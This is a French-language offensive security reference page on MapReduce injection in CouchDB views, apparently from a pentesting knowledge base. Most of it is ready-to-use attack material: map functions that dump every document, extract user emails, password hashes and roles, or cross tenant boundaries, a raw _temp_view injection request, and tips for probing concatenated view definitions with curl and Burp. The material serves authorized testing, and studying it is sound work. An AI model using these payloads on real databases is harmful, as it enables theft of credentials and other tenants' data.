---
title: "Injection MapReduce dans les vues CouchDB"
description: "Les fonctions map et reduce de CouchDB sont du JavaScript, donc une définition de vue contrôlée par l'attaquant s'exécute côté serveur et emit() peut faire fuir des documents hors de la portée prévue."
keywords:
  - injection MapReduce CouchDB
  - fonction map
  - fonction reduce
  - fuite via emit
  - définition de vue
  - index secondaire
---

# Injection MapReduce

Les index secondaires de CouchDB sont des **vues**, et une vue est une paire de fonctions JavaScript stockées dans un document de conception : une fonction `map` qui `emit` des paires clé/valeur, et une fonction `reduce` optionnelle qui les agrège. Le query server exécute les deux sur les documents de la base. Lorsqu'un attaquant contrôle une définition de vue, ou peut influencer le corps map/reduce qu'une application assemble, ce JavaScript s'exécute côté serveur à travers l'ensemble de données.

## La fonction map s'exécute sur chaque document

Une fonction map reçoit chaque document et décide de ce qu'il faut indexer :

```json
{
  "views": {
    "leak": {
      "map": "function(doc){ emit(doc._id, doc); }"
    }
  }
}
```

Émettre le `doc` entier comme valeur signifie que la vue matérialise une copie de chaque document, quels que soient les champs que l'application entendait exposer. Interroger la vue renvoie ces valeurs directement :

```http
GET /app/_design/x/_view/leak?include_docs=false HTTP/1.1
```

Une fonction map qui émet des champs sensibles sélectionnés est tout aussi efficace et moins coûteuse à construire :

```javascript
function(doc){
  if (doc.type === "user") {
    emit(doc._id, { email: doc.email, hash: doc.password_hash, role: doc.role });
  }
}
```

Parce que la fonction map s'exécute côté serveur sans restriction au niveau des lignes, il n'y a pas de filtre par utilisateur sauf si la fonction en impose un elle-même. Une fonction map injectée peut supprimer chaque condition que l'auteur original avait ajoutée, élargissant la vue à toute la base.

## Franchir la portée prévue avec emit()

L'application peut vouloir une vue indexée sur, par exemple, un identifiant de locataire afin que les appelants ne lisent jamais que leurs propres lignes. Une fonction map contrôlée par l'attaquant ignore cette intention :

```javascript
function(doc){
  emit([doc.tenant, doc._id], doc);   // every tenant, every document
}
```

Combiné aux paramètres de plage sur la requête (`startkey`, `endkey`), l'appelant lit alors au-delà des frontières de locataire. Une fonction map peut aussi atteindre les métadonnées de pièces jointes et les `_conflicts` qu'une vue à portée étroite ne ferait jamais remonter :

```javascript
function(doc){ emit(doc._id, { attachments: doc._attachments, conflicts: doc._conflicts }); }
```

## Abuser de reduce

La fonction reduce est aussi du JavaScript et s'exécute avec la même portée. Un corps reduce est injectable de la même manière qu'un corps map, et peut servir à compter ou agréger sur tout l'ensemble pour confirmer que des données existent avant de les extraire :

```json
{ "views": { "n": { "map": "function(doc){emit(null,1);}", "reduce": "_count" } } }
```

Remplacer `_count` par un corps de fonction personnalisé exécute du JavaScript de l'attaquant pendant la phase reduce.

## Vues temporaires et assemblées

Les anciennes versions de CouchDB exposaient `POST /db/_temp_view` prenant une fonction map dans le corps de la requête, ce qui est un point d'injection direct lorsqu'il est atteignable :

```http
POST /app/_temp_view HTTP/1.1
Content-Type: application/json

{ "map": "function(doc){ emit(doc._id, doc); }" }
```

Lorsqu'une application construit une définition de vue à partir d'une entrée utilisateur (un nom de champ à indexer, une expression de filtre) et la concatène dans la chaîne de la fonction, l'attaquant ferme l'expression prévue et ajoute son propre JavaScript, exactement comme avec n'importe quel point d'injection de code construit par chaînes. Sondez en soumettant une valeur qui casserait la syntaxe de la fonction environnante et en observant une erreur de compilation du query server dans la réponse.

## Outils

- **curl** : soumettre des définitions de vue forgées et interroger l'index résultant.
- **Burp Repeater** : délivrer le corps map ou reduce injecté via le point d'injection.

## Références

- [Apache CouchDB: Views and MapReduce](https://docs.couchdb.org/en/stable/ddocs/views/intro.html)
- [Apache CouchDB: View API](https://docs.couchdb.org/en/stable/api/ddoc/views.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
